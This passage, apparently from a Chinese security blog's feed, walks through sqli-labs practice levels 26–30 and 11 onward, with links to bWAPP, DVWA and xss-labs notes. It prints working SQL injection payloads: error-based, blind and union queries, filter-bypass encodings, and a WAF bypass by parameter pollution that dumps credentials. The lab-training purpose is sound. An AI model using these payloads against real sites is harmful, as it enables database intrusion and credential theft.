class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现此函数过滤了一堆，空格、or、and、#、/、\、单行注释、多行注释；</p><p>and&amp;or我们可以双写绕过，空格怎么绕呢？</p><p>我们熟知的有：<br>/**/ （） + ` \t<br>可是都不行，他的过滤很多 。 我们尝试url编码绕过：</p><p>%09 Tab键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 键<br>%0b Tab键（垂直）<br>%a0 空格<br>() 绕过</p><p>对于注释和结尾字符的我们此处只能利用构造一个 ‘来闭合后面到 ‘ ；</p><p>报错注入、()代替空格、anandd’1’=’1或%26%26and’1’=’1代替注释、双写绕过and&amp;or</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=1%27anandd(updatexml(1,concat(0x7e,database(),0x7e),1))%26%26and'1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427202042604.png" alt="image-20210427202042604"></p><p>不知道为啥空格没法绕过，注不下去了</p><h2 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h2><p>此关与上关的区别在于sql语句多了个），我们需要闭合）</p><pre class="line-numbers language-none"><code class="language-none">$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且发现他关闭了详细的报错，我们需要盲注</p><p>跟上关一样，空格还是没法绕过。。。</p><p>加了）发现没报错，说明原来的语句确实有括号</p><pre class="line-numbers language-none"><code class="language-none">?id=1)' aandnd'1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h2><p>查看源码：</p><pre class="line-numbers language-none"><code class="language-none">function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);//strip out /*$id= preg_replace('/[--]/',"", $id);//Strip out --.$id= preg_replace('/[#]/',"", $id);//Strip out #.$id= preg_replace('/[ +]/',"", $id);    //Strip out spaces.$id= preg_replace('/select/m',"", $id);    //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);    //Strip out spaces.$id= preg_replace('/union/s',"", $id);    //Strip out union$id= preg_replace('/select/s',"", $id);    //Strip out select$id= preg_replace('/UNION/s',"", $id);    //Strip out UNION$id= preg_replace('/SELECT/s',"", $id);    //Strip out SELECT$id= preg_replace('/Union/s',"", $id);    //Strip out Union$id= preg_replace('/Select/s',"", $id);    //Strip out selectreturn $id;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比上关多过滤了select和union</p><p>报错注入</p><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">?id=1'and%0Aextractvalue(1,concat(0x7e,(sELEct%0Adatabase())))and'1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427212028050.png"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">?id=1'%0Aand%0Aextractvalue(1,concat(0x7e,(sELEct%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database())))and'1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427213707314.png" alt="image-20210427213707314"></p><p>爆列名：</p><pre class="line-numbers language-none"><code class="language-none">?id=1%27%0Aand%0Aextractvalue(1,concat(0x7e,(sELEct%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name='users')))and%271%27=%271<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427214117163.png" alt="image-20210427214117163"></p><p>爆值：</p><pre class="line-numbers language-none"><code class="language-none">?id=1%27%0Aand%0Aextractvalue(1,concat(0x7e,(sELEct%0Agroup_concat(username,0x3a,password)%0Afrom%0Asecurity.users)))and%271%27=%271<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427214344217.png" alt="image-20210427214344217"></p><h2 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us（过滤了union和select的盲注）"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us（过滤了union和select的盲注）" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us（过滤了union和select的盲注）"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us（过滤了union和select的盲注）</h2><p>上关的盲注版，双引号闭合</p><p>单引号没报错，双引号报错，所以是双引号闭合</p><pre class="line-numbers language-none"><code class="language-none">?id=1" and"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427215127692.png" alt="image-20210427215127692"></p><p>关闭了详细的报错提示，需要盲注；使用布尔盲注，正确会回显，错误不会回显</p><p>爆库长：</p><pre class="line-numbers language-none"><code class="language-none">?id=1"%0aand(length(database())=8)and"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427215606240.png" alt="image-20210427215606240"></p><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">?id=1"%0aand(left((sELEct%0adatabase() ),8)='security')and"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427215904426.png" alt="image-20210427215904426"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">?id=1"%0aand(left((sELEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a3,1 ),5)='users')and"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427220242953.png" alt="image-20210427220242953"></p><p>忽然想到他是有会先啊,还盲注啥啊，直接联合注入他不香吗？</p><p>爆列名：基于错误才会回显</p><pre class="line-numbers language-none"><code class="language-none">?id=1"%0aAnd%0a(length(database())&gt;8)%0auNion%0asELect%0a1,(group_concat(column_name)),3%0afrom%0ainformation_schema.columns%0awhere%0atable_name='users'and"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427221159910.png" alt="image-20210427221159910"></p><p>爆值：这里就不能用and了，因为语法select xxx from xxx where xxx</p><pre class="line-numbers language-none"><code class="language-none">?id=1"%0AAnd%0A(length(database())&gt;8)%0AUNion%0ASElect%0A(1),(group_concat(username)),(3)from%0Asecurity.users%0Awhere"1"="1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210427221802151.png" alt="image-20210427221802151"></p><h2 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis（基于错误的，有括号的单引号字符型，过滤了union和select等的注入）"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis（基于错误的，有括号的单引号字符型，过滤了union和select等的注入）" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis（基于错误的，有括号的单引号字符型，过滤了union和select等的注入）"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis（基于错误的，有括号的单引号字符型，过滤了union和select等的注入）</h2><p>我们输入单引号报错，双引号不报错，说明时单引号闭合；</p><p>;%00注释正确，说明确实是单引号闭合;</p><p>加括号无报错，说明原语句有括号</p><pre class="line-numbers language-none"><code class="language-none">?id=1)' and'1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用%0a绕过空格过滤，使用双写绕过union&amp;select，基于错误回显，联合注入</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=.1') %0aunion%0aunion%0aselect%0aselect%0a1,2,database()%0a;%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210428104747300.png" alt="image-20210428104747300"></p><p>还是正常步骤，不在赘述</p><h2 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis（基于盲注的，有括号的单引号字符型，过滤了union和select等的注入）"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis（基于盲注的，有括号的单引号字符型，过滤了union和select等的注入）" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis（基于盲注的，有括号的单引号字符型，过滤了union和select等的注入）"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis（基于盲注的，有括号的单引号字符型，过滤了union和select等的注入）</h2><p>说是盲注，但是还是有回显，那我们直接基于错误联合注入就行</p><pre class="line-numbers language-none"><code class="language-none">?id=1') ;%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单引号）闭合，;%00注释</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=.1')union%0aunion%0aselect%0aselect%0a1,2,database();%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210428105638648.png" alt="image-20210428105638648"></p><p>还是正常步骤，不在赘述</p><h2 id="Less-29-基于WAF的一个错误"><a href="#Less-29-基于WAF的一个错误" class="headerlink" title="Less-29 基于WAF的一个错误"></a>Less-29 基于WAF的一个错误</h2><p><strong>HTTP参数污染（HTTP Parameter Pollution）</strong> 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210428110722380.png" alt="image-20210428110722380"></p><p><img src="/2021/04/25/sqli-labs21-30/image-20210428110739205.png" alt="image-20210428110739205"></p><p><strong>waf服务器（tomcat）</strong>只<strong>解析</strong>重复参数里面的<strong>前者</strong>，而真正的<strong>web服务器</strong>（Apache）只<strong>解析</strong>重复参数里面的<strong>后者</strong>，我们可以传入两个id参数，前者合法而后者为我们想注入的内容</p><p>单引号闭合，–+注释，基于错误的联合注入</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=1&amp;id=-1' union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210428111223771.png" alt="image-20210428111223771"></p><p>正常步骤，不在赘述</p><h2 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a><strong>Less-30</strong> Get-Blind Havaing with WAF</h2><p>单引号正常，双引号报错，–+注释，基于错误的联合注入</p><p>同上关，只不过换成了双引号”闭合</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BWAPP全通关</title>
      <link href="/2021/04/12/bwapp-tong-guan/"/>
      <url>/2021/04/12/bwapp-tong-guan/</url>
      
        <content type="html"><![CDATA[<h1 id="BWAPP全通关"><a href="#BWAPP全通关" class="headerlink" title="BWAPP全通关"></a>BWAPP全通关</h1><p>还是以前的笔记，有道上拉过来，bee-box环境暂时没做</p><span id="more"></span><h2 id="A1"><a href="#A1" class="headerlink" title="(A1)"></a>(A1)</h2><h3 id="injection之1-10-A1"><a href="#injection之1-10-A1" class="headerlink" title="injection之1-10(A1)"></a>injection之1-10(A1)</h3><p><a href="http://note.youdao.com/noteshare?id=4b78b4b94f285fac52641bdecb417674&amp;sub=0AFF3360FB054E4581F957864601C698">http://note.youdao.com/noteshare?id=4b78b4b94f285fac52641bdecb417674&amp;sub=0AFF3360FB054E4581F957864601C698</a></p><h3 id="injection之11-20-A1"><a href="#injection之11-20-A1" class="headerlink" title="injection之11-20(A1)"></a>injection之11-20(A1)</h3><p><a href="http://note.youdao.com/noteshare?id=15211891d3416851ef01c40e6135349e&amp;sub=BA26F3A10D494E938A23D3404D865DCD">http://note.youdao.com/noteshare?id=15211891d3416851ef01c40e6135349e&amp;sub=BA26F3A10D494E938A23D3404D865DCD</a></p><h3 id="injection之21-31-A1"><a href="#injection之21-31-A1" class="headerlink" title="injection之21-31(A1)"></a>injection之21-31(A1)</h3><p><a href="http://note.youdao.com/noteshare?id=c05a5d43157064bfb91502b8f380291b&amp;sub=C67CBF48FEFC4E838BDAF8EBAE2EB3C3">http://note.youdao.com/noteshare?id=c05a5d43157064bfb91502b8f380291b&amp;sub=C67CBF48FEFC4E838BDAF8EBAE2EB3C3</a></p><h2 id="A2"><a href="#A2" class="headerlink" title="(A2)"></a>(A2)</h2><h3 id="Broken-Auth-amp-session-Mgmt之32-42-A2"><a href="#Broken-Auth-amp-session-Mgmt之32-42-A2" class="headerlink" title="Broken Auth&amp; session Mgmt之32-42(A2)"></a>Broken Auth&amp; session Mgmt之32-42(A2)</h3><p><a href="http://note.youdao.com/noteshare?id=2fe291ae504313f0d9ff842d28b52e23&amp;sub=0A0228B38FE74AB6B3DBC4038809341A">http://note.youdao.com/noteshare?id=2fe291ae504313f0d9ff842d28b52e23&amp;sub=0A0228B38FE74AB6B3DBC4038809341A</a></p><h2 id="A3"><a href="#A3" class="headerlink" title="(A3)"></a>(A3)</h2><h3 id="XSS之43-52-A3"><a href="#XSS之43-52-A3" class="headerlink" title="XSS之43-52(A3)"></a>XSS之43-52(A3)</h3><p><a href="http://note.youdao.com/noteshare?id=2578a52851d333e24fd7fda0edafd301&amp;sub=E543443F36EC4A9DBDF7E5DB2C83E6E4">http://note.youdao.com/noteshare?id=2578a52851d333e24fd7fda0edafd301&amp;sub=E543443F36EC4A9DBDF7E5DB2C83E6E4</a></p><h3 id="XSS之53-61-A3"><a href="#XSS之53-61-A3" class="headerlink" title="XSS之53-61(A3)"></a>XSS之53-61(A3)</h3><p><a href="http://note.youdao.com/noteshare?id=059955f3ad1257379d3a4b084c4ac0ca&amp;sub=6FED6266E77E4D18A10C6859E15950A2">http://note.youdao.com/noteshare?id=059955f3ad1257379d3a4b084c4ac0ca&amp;sub=6FED6266E77E4D18A10C6859E15950A2</a></p><h2 id="A4"><a href="#A4" class="headerlink" title="(A4)"></a>(A4)</h2><h3 id="Insecure-Direct-Object-References之62-64-A4"><a href="#Insecure-Direct-Object-References之62-64-A4" class="headerlink" title="Insecure Direct Object References之62-64(A4)"></a>Insecure Direct Object References之62-64(A4)</h3><p><a href="http://note.youdao.com/noteshare?id=9adf8e45e23cb193927a36a83e4315aa&amp;sub=FADB4569A6B6424AA808AF903EF796CF">http://note.youdao.com/noteshare?id=9adf8e45e23cb193927a36a83e4315aa&amp;sub=FADB4569A6B6424AA808AF903EF796CF</a></p><h2 id="A5"><a href="#A5" class="headerlink" title="(A5)"></a>(A5)</h2><h3 id="Security-Misconfiguration之65-74-A5"><a href="#Security-Misconfiguration之65-74-A5" class="headerlink" title="Security Misconfiguration之65-74(A5)"></a>Security Misconfiguration之65-74(A5)</h3><p><a href="http://note.youdao.com/noteshare?id=19fb216f950663b70fc4788e7721dc75&amp;sub=4FE0ED333F604ED4A92CE3BB9F901D92">http://note.youdao.com/noteshare?id=19fb216f950663b70fc4788e7721dc75&amp;sub=4FE0ED333F604ED4A92CE3BB9F901D92</a></p><h3 id="Security-Misconfiguration之75-81-A5"><a href="#Security-Misconfiguration之75-81-A5" class="headerlink" title="Security Misconfiguration之75-81(A5)"></a>Security Misconfiguration之75-81(A5)</h3><p><a href="http://note.youdao.com/noteshare?id=9ebc07c1e281206735a3e7669219e7f3&amp;sub=82F7EAD3DAC64C07A3E61808020A9A85">http://note.youdao.com/noteshare?id=9ebc07c1e281206735a3e7669219e7f3&amp;sub=82F7EAD3DAC64C07A3E61808020A9A85</a></p><h2 id="A6"><a href="#A6" class="headerlink" title="(A6)"></a>(A6)</h2><h3 id="Sensitive-Data-Exposure之82-90-A6"><a href="#Sensitive-Data-Exposure之82-90-A6" class="headerlink" title="Sensitive Data Exposure之82-90(A6)"></a>Sensitive Data Exposure之82-90(A6)</h3><p><a href="http://note.youdao.com/noteshare?id=0b4d7fbbdde3579b779f366db9e75b02&amp;sub=FD060E9BE2C74EE69A1502641DC520BD">http://note.youdao.com/noteshare?id=0b4d7fbbdde3579b779f366db9e75b02&amp;sub=FD060E9BE2C74EE69A1502641DC520BD</a></p><h2 id="A7"><a href="#A7" class="headerlink" title="(A7)"></a>(A7)</h2><h3 id="Missing-functional-level-Access-control之91-99-A7"><a href="#Missing-functional-level-Access-control之91-99-A7" class="headerlink" title="Missing functional level Access control之91-99(A7)"></a>Missing functional level Access control之91-99(A7)</h3><p><a href="http://note.youdao.com/noteshare?id=7f0088fa0dd47665d6f923d21b01470c&amp;sub=5519AED61DE74957888E343093F836E0">http://note.youdao.com/noteshare?id=7f0088fa0dd47665d6f923d21b01470c&amp;sub=5519AED61DE74957888E343093F836E0</a></p><h2 id="A8"><a href="#A8" class="headerlink" title="(A8)"></a>(A8)</h2><h3 id="CSRF之100-102-A8"><a href="#CSRF之100-102-A8" class="headerlink" title="CSRF之100-102(A8)"></a>CSRF之100-102(A8)</h3><p><a href="http://note.youdao.com/noteshare?id=1f24498c57bb71987ef7d9ddcdef42bc&amp;sub=01F31F5D11C748838AC0D65DDC3D6D94">http://note.youdao.com/noteshare?id=1f24498c57bb71987ef7d9ddcdef42bc&amp;sub=01F31F5D11C748838AC0D65DDC3D6D94</a></p><h2 id="A9"><a href="#A9" class="headerlink" title="(A9)"></a>(A9)</h2><h3 id="Using-Known-Vulnerable-Components之103-113-A9"><a href="#Using-Known-Vulnerable-Components之103-113-A9" class="headerlink" title="Using Known Vulnerable Components之103-113(A9)"></a>Using Known Vulnerable Components之103-113(A9)</h3><p><a href="http://note.youdao.com/noteshare?id=366c610df5f259f79ad0c75bb57601a9&amp;sub=DC2ED810ABEC477C96A1B49FA65EE937">http://note.youdao.com/noteshare?id=366c610df5f259f79ad0c75bb57601a9&amp;sub=DC2ED810ABEC477C96A1B49FA65EE937</a></p><h2 id="A10"><a href="#A10" class="headerlink" title="(A10)"></a>(A10)</h2><h3 id="Unvalidated-Redirects-Forwards之114-amp-115-A10"><a href="#Unvalidated-Redirects-Forwards之114-amp-115-A10" class="headerlink" title="Unvalidated Redirects Forwards之114&amp;115(A10)"></a>Unvalidated Redirects Forwards之114&amp;115(A10)</h3><p><a href="http://note.youdao.com/noteshare?id=f5df59bece9cc6d934a8faa0e77783d2&amp;sub=43CCEACD9ABB4505A43BC23B38AB6813">http://note.youdao.com/noteshare?id=f5df59bece9cc6d934a8faa0e77783d2&amp;sub=43CCEACD9ABB4505A43BC23B38AB6813</a></p><h2 id="Other-Bugs"><a href="#Other-Bugs" class="headerlink" title="Other Bugs"></a>Other Bugs</h2><h3 id="Other-bugs之116-126"><a href="#Other-bugs之116-126" class="headerlink" title="Other bugs之116-126"></a>Other bugs之116-126</h3><p><a href="http://note.youdao.com/noteshare?id=9b7b953b82721208d13d5fb5bb9da457&amp;sub=3BB0D6216FBE42E6ABF2626397C30309">http://note.youdao.com/noteshare?id=9b7b953b82721208d13d5fb5bb9da457&amp;sub=3BB0D6216FBE42E6ABF2626397C30309</a></p><h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><h3 id="Extra之127-135"><a href="#Extra之127-135" class="headerlink" title="Extra之127-135"></a>Extra之127-135</h3><p><a href="http://note.youdao.com/noteshare?id=92780edaaaf1eebc67c5a3e1c4b96cbf&amp;sub=8DC50F4BF8C34FF29ACF12B2AC5F4F72">http://note.youdao.com/noteshare?id=92780edaaaf1eebc67c5a3e1c4b96cbf&amp;sub=8DC50F4BF8C34FF29ACF12B2AC5F4F72</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bwapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA全通关</title>
      <link href="/2021/04/02/dvwa-tong-guan/"/>
      <url>/2021/04/02/dvwa-tong-guan/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA通关"><a href="#DVWA通关" class="headerlink" title="DVWA通关"></a>DVWA通关</h1><p>还是以前的笔记，有道上拉过来</p><span id="more"></span><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><a href="http://note.youdao.com/noteshare?id=03e52fb2058f4b2f36c72a453bdc45b2&amp;sub=B30CB55E2AA84F088C532234B826E6B7">http://note.youdao.com/noteshare?id=03e52fb2058f4b2f36c72a453bdc45b2&amp;sub=B30CB55E2AA84F088C532234B826E6B7</a></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p><a href="http://note.youdao.com/noteshare?id=a5f9bf1c843874cfc28fca38ce445b3a&amp;sub=D1D285EA5AA148319F9E25F4DBECEFBF">http://note.youdao.com/noteshare?id=a5f9bf1c843874cfc28fca38ce445b3a&amp;sub=D1D285EA5AA148319F9E25F4DBECEFBF</a></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="http://note.youdao.com/noteshare?id=859f8319a954e3bca1c3b83a889f1a70&amp;sub=33E5C77ABA7748B29B02F36F88D38675">http://note.youdao.com/noteshare?id=859f8319a954e3bca1c3b83a889f1a70&amp;sub=33E5C77ABA7748B29B02F36F88D38675</a></p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><a href="http://note.youdao.com/noteshare?id=8b0ddd9ba807095fae98794add90b8aa&amp;sub=6B5195EEDBEF4CE89101226AF5022619">http://note.youdao.com/noteshare?id=8b0ddd9ba807095fae98794add90b8aa&amp;sub=6B5195EEDBEF4CE89101226AF5022619</a></p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p><a href="http://note.youdao.com/noteshare?id=f4ca27a6e46fb95de164444b43a6788a&amp;sub=D0254BE38F2B47398C8F83BE618A8E67">http://note.youdao.com/noteshare?id=f4ca27a6e46fb95de164444b43a6788a&amp;sub=D0254BE38F2B47398C8F83BE618A8E67</a></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>出了点问题，也写了写</p><p><a href="http://note.youdao.com/noteshare?id=091f400c7ed6df5ef6203f8f79f03c8a&amp;sub=A1D09C73188E49AE81C790A951291A1D">http://note.youdao.com/noteshare?id=091f400c7ed6df5ef6203f8f79f03c8a&amp;sub=A1D09C73188E49AE81C790A951291A1D</a></p><h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h2><p>环境出了问题，做不了</p><h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><p><a href="http://note.youdao.com/noteshare?id=ff1b9d7add45a07187b7c0f349b90791&amp;sub=161A6B051D684A0087D26ACDB3D022CC">http://note.youdao.com/noteshare?id=ff1b9d7add45a07187b7c0f349b90791&amp;sub=161A6B051D684A0087D26ACDB3D022CC</a></p><h2 id="反射XSS"><a href="#反射XSS" class="headerlink" title="反射XSS"></a>反射XSS</h2><p><a href="http://note.youdao.com/noteshare?id=64faf8e35484ab241ccdc8c5b785a1cc&amp;sub=7B39FB6DD1F14A7DB5FE89AA65673304">http://note.youdao.com/noteshare?id=64faf8e35484ab241ccdc8c5b785a1cc&amp;sub=7B39FB6DD1F14A7DB5FE89AA65673304</a></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><a href="http://note.youdao.com/noteshare?id=8aedacd7a278565e9abcaf3730d3d9c0&amp;sub=3E5389F5995E4B79B7E1E675A4817B34">http://note.youdao.com/noteshare?id=8aedacd7a278565e9abcaf3730d3d9c0&amp;sub=3E5389F5995E4B79B7E1E675A4817B34</a></p><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p><a href="http://note.youdao.com/noteshare?id=480e68c822f7e38764219cce89cc1c60&amp;sub=E68D0496E686468EB31381BEB8F9D005">http://note.youdao.com/noteshare?id=480e68c822f7e38764219cce89cc1c60&amp;sub=E68D0496E686468EB31381BEB8F9D005</a></p><h2 id="Content-Security-Policy-CSP-Bypass"><a href="#Content-Security-Policy-CSP-Bypass" class="headerlink" title="Content Security Policy (CSP) Bypass"></a>Content Security Policy (CSP) Bypass</h2><p><a href="http://note.youdao.com/noteshare?id=73afeef7b2ff1bf5d895a313e2e2a5a5&amp;sub=51075B8BB38F4174BAA65EA86C314FB8">http://note.youdao.com/noteshare?id=73afeef7b2ff1bf5d895a313e2e2a5a5&amp;sub=51075B8BB38F4174BAA65EA86C314FB8</a></p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p><a href="http://note.youdao.com/noteshare?id=ca6c0b01f3c80149c6c3b3572040ab5f&amp;sub=D4A3A84B5D544775BBA4EAC4704F9C9D">http://note.youdao.com/noteshare?id=ca6c0b01f3c80149c6c3b3572040ab5f&amp;sub=D4A3A84B5D544775BBA4EAC4704F9C9D</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs通关</title>
      <link href="/2021/03/24/xss-labs-tong-guan/"/>
      <url>/2021/03/24/xss-labs-tong-guan/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs通过1-20"><a href="#xss-labs通过1-20" class="headerlink" title="xss-labs通过1-20"></a>xss-labs通过1-20</h1><p>由于以前的笔记在有道上写的，这里直接放上分享的网址</p><span id="more"></span><h2 id="xss-labs1-10"><a href="#xss-labs1-10" class="headerlink" title="xss-labs1-10"></a>xss-labs1-10</h2><p><a href="http://note.youdao.com/noteshare?id=b25cf8de909d804b2a8fdfadbaf1bc72&amp;sub=76296B27692D4ED3837B355AABFDB876">http://note.youdao.com/noteshare?id=b25cf8de909d804b2a8fdfadbaf1bc72&amp;sub=76296B27692D4ED3837B355AABFDB876</a></p><h2 id="xss-labs11-20"><a href="#xss-labs11-20" class="headerlink" title="xss-labs11-20"></a>xss-labs11-20</h2><p><a href="http://note.youdao.com/noteshare?id=8f32fce120656cedde599010dbef36b4&amp;sub=048675BD5B8C402C8DE4DD306F147E81">http://note.youdao.com/noteshare?id=8f32fce120656cedde599010dbef36b4&amp;sub=048675BD5B8C402C8DE4DD306F147E81</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs11-20</title>
      <link href="/2021/03/20/sqli-labs11-20/"/>
      <url>/2021/03/20/sqli-labs11-20/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关（11-20）"><a href="#sqli-labs通关（11-20）" class="headerlink" title="sqli-labs通关（11-20）"></a>sqli-labs通关（11-20）</h1><span id="more"></span><h2 id="第十一关（基于错误的POST单引号字符型注入）"><a href="#第十一关（基于错误的POST单引号字符型注入）" class="headerlink" title="第十一关（基于错误的POST单引号字符型注入）"></a><strong>第十一关（基于错误的POST单引号字符型注入）</strong></h2><p>输入admin admin登录 抓包，发送到repeater模块</p><p><img src="/2021/03/20/sqli-labs11-20/clipboard.jpg" alt="img"></p><p>在repeater模块中通过修改POST参数进行注入</p><p><strong>方法一extractvalue测试payload</strong></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and 1=1--+&amp;passwd=admin&amp;submit=Submit  //能登陆<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/1.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">uname=admin' and 1=2--+&amp;passwd=admin&amp;submit=Submit  //不能登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/2.png" alt="img"></p><p>说明注入生效，存在<strong>报错型注入</strong></p><p><strong>爆库名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload= uname=admin' and extractvalue(1,concat(0x7e,(select database() )))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/03/20/sqli-labs11-20/3.png" alt="img"></p><p><strong>爆表名</strong></p><pre class="line-numbers language-none"><code class="language-none">payload=uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from 